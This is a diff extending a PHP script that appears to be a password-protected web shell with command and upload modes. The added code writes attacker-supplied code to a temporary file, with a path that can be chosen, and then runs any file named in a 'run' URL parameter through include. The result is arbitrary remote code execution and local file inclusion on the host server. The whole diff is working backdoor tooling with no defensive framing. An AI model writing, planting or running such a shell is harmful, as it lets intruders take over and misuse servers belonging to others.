@@ -96,6 +96,26 @@ if($mode == iframe){
   exit;
 }
 
+// run code
+if($_POST['run']){
+    $code = $_POST['code'];
+
+    if($_POST['tmp']){
+        $tmp_file =$_POST['tmp'];
+    }else{
+        $tmp_file = tempnam(sys_get_temp_dir(), '');
+    };
+
+    if(file_put_contents("$tmp_file","$code")){
+        $tmp_run = $tmp_file;
+    };
+};
+if($_GET['run']){
+    $run = $_GET['run'];
+    include "$run";
+    exit;
+};
+
 // header html
 echo "<html>
 <head>
@@ -205,9 +225,11 @@ if ($mode == "command") {
           $run = ob_get_clean();
           echo(htmlspecialchars($run));
         };
+      }elseif($_POST['code']){
+        echo(htmlspecialchars($_POST['code']));
       };
 
-      echo "</textarea></div><br>
+      echo "</textarea></div><br><input type='hidden' name='tmp' value='$tmp_run'><input onclick='$encButton' type='submit' name='run' value='run >>' style='background-color: #747d8c;color: #f1f2f6; float: right;'>
 
     <table style='width:100%'>
     <tr style='text-align:center'>
@@ -268,6 +290,8 @@ if ($mode == "command") {
 		  } else {
 			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed upload");
 		  }
+    } elseif($tmp_run){
+        die("<mark style='background: #ffffff'><a href='?$param=$pass&run=$tmp_run' target='_blank' style='color:#2ed573'> run click here</a> -> $tmp_run");
     };
 
 
